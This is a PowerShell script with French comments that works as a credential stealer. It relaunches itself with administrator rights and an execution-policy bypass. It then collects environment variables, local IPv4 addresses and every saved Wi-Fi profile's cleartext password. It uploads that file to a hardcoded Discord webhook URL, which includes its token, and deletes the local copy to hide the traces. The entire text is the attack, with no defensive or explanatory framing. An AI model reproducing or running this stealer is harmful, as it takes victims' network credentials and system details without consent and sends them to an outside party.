# Vérifier si le script est exécuté avec des privilèges d'administrateur
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Relancer le script en tant qu'administrateur
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}
# URL du webhook Discord
$url = "https://discord.com/api/webhooks/1041694504509513849/MjNgj3FYhmCtuOKJmuCyLy2_bOO38Tv3lyklW6KlnIUOms6fGb6gZzKVpEbSsNUdKovI"

# RÃ©cupÃ©rer les informations rÃ©seau et Wi-Fi
dir env: >> stats.txt
Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress, SuffixOrigin | Where-Object { $_.IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' } >> stats.txt
(netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    (netsh wlan show profile name="$name" key=clear)
} | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
    $pass = $_.Matches.Groups[1].Value.Trim()
    [PSCustomObject]@{
        PROFILE_NAME = $name
        PASSWORD     = $pass
    }
} | Format-Table -AutoSize >> stats.txt

# Envoyer un message avec le fichier
$boundary = [System.Guid]::NewGuid().ToString()
$headers = @{
    'Content-Type' = "multipart/form-data; boundary=$boundary"
}

$fileContent = Get-Content -Path "stats.txt" -Raw
$body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="stats.txt"
Content-Type: text/plain

$fileContent
--$boundary--
"@

Invoke-RestMethod -Uri $url -Method Post -Body $body -Headers $headers

# Supprimer le fichier temporaire
Remove-Item '.\stats.txt'
